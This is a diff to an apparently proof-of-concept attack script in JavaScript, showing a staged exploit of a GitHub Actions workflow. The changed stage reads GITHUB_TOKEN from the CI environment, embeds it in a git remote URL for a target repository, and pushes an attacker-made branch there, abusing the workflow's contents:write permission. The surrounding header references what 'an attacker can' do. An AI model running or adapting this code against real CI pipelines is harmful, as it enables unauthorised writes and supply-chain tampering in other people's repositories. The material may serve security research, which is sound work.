@@ -105,16 +105,32 @@ With \`contents:write\`, an attacker can:
     }
     console.log("");
 
-    // Stage 4: Push to Repository (using credentials from actions/checkout)
-    console.log("[Stage 4] Pushing to Repository");
+    // Stage 4: Push to TARGET Repository (using GITHUB_TOKEN)
+    console.log("[Stage 4] Pushing to Target Repository");
     try {
         // Create new branch
         execSync(`git checkout -b ${branch}`, {stdio: 'pipe'});
         console.log("  ✓ Created branch:", branch);
 
-        // Push using existing credentials (set by actions/checkout)
-        // The extraheader auth is already configured
-        const pushOutput = execSync(`git push origin ${branch} 2>&1`, {encoding: 'utf8'});
+        // GITHUB_TOKEN has contents:write for the TARGET repo (robertprast), not the fork (treborlab)
+        // We need to add the target repo as a remote and push there
+        const token = process.env.GITHUB_TOKEN || process.env.INPUT_GITHUB_TOKEN;
+        if (!token) {
+            console.log("  ! No GITHUB_TOKEN found");
+        } else {
+            console.log("  ✓ GITHUB_TOKEN available");
+        }
+
+        // Add target repo as remote with token auth
+        const targetUrl = `https://x-access-token:${token}@github.com/${repo}.git`;
+        try {
+            execSync('git remote remove target 2>/dev/null || true', {stdio: 'pipe'});
+        } catch {}
+        execSync(`git remote add target "${targetUrl}"`, {stdio: 'pipe'});
+        console.log("  ✓ Added target remote:", repo);
+
+        // Push to TARGET repo (where we have contents:write)
+        const pushOutput = execSync(`git push target ${branch} 2>&1`, {encoding: 'utf8'});
         console.log("  ✓ Push output:", pushOutput.trim());
 
         console.log("");
